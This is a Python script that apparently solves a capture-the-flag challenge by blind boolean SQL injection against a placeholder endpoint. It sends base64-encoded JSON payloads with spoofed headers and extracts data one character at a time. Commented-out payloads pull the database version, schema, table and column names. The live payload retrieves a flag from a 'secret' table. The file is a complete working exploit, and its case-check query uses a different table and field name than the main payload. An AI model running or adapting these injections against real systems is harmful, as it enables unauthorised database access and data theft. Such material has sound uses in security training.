import requests
import base64


print ("Retrieving sensitive info")
url = "http://XYZ.com/vulnerable_endpoint"
headers = {"User-Agent": "SAMSUNG-SGH-I617/1.0 Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.12) UP.Link/6.3.0.0.0",
"Accept": "*/*",
"X-Forwarded-For":"192.168.1.1",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"Host": "XYZ.com",
"Content-Length": "200",
"Connection": "close",
"Content-Type": "application/json"}
#proxy = {"http" : "http://127.0.0.1:8080"}

charset="abcdefghijklmnopqrstuvwxyz0123456789.ABCDEFGHIJKLMNOPQRSTUVWXYZ_@-.{}"
output=''

for x in range(40):
    for char in charset:
        
        

     #the below injection used to dump db version 
     #injection = "9999' or substring(@@version, %d, 1) ='%s'; -- -"  % (x, char)
    
     #the below injection used to dump the database name
     #injection = "9999' or substring((SELECT database()), %d, 1) ='%s'; -- -" % (x,char)

     #the below injection used to dump table names from 'CTF' database
     #injection = "9999' or substring((SELECT table_name FROM information_schema.tables WHERE table_schema = 'CTF' Limit 0,1), %d, 1) = '%s'; -- -" % (x,char)

     #the below injection used to dump column names from 'users' table
     #injection = "9999' or substring((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' Limit 0,1), %d, 1) = '%s'; -- -" % (x, char)

     #the below injection used to dump coulmn names from 'secret' table
     #injection = "9999' or substring((SELECT column_name FROM information_schema.columns WHERE table_name = 'secret' Limit 1,1), %d, 1) = '%s'; -- -" % (x, char)

     #I used the below injection to reach the objective
     injection = "9999' or substring((SELECT flag from secret limit 0,1), %d, 1) = '%s';-- -" %(x, char)


     data2='{"value": "%s"}' % injection
     data4=base64.b64encode(data2.encode())
     req=requests.post(url, headers=headers, data=data4.decode()).text
     
     if "1" in req:             # 1 = true condition = correct letter
         #check wether it's capital or small letter for accurate results, otherwise we won't be able to distinguish lower from upper case letters
         injection= "9999' or ASCII(UPPER(SUBSTRING((SELECT flag from s3cr3ttabl3 limit 0,1),%d,1)) = ASCII(SUBSTRING((SELECT flag from s3cr3ttabl3 limit 0,1), %d,1)));-- -" %(x,x)
         data2='{"search-value": "%s"}' % injection
         data4=base64.b64encode(data2.encode())
         req=requests.post(url, headers=headers, data=data4.decode()).text
         if "1" in req:         # 1 = true condition = char is uppercase
             char = char.upper()
             print('found char: '+ char + '----- ' + 'at position: ' + str(x))
             output+= char
             break
        
         else:
             print('found char: '+ char + '----- ' + 'at position: ' + str(x))
             output+= char
             break
        
print(output)
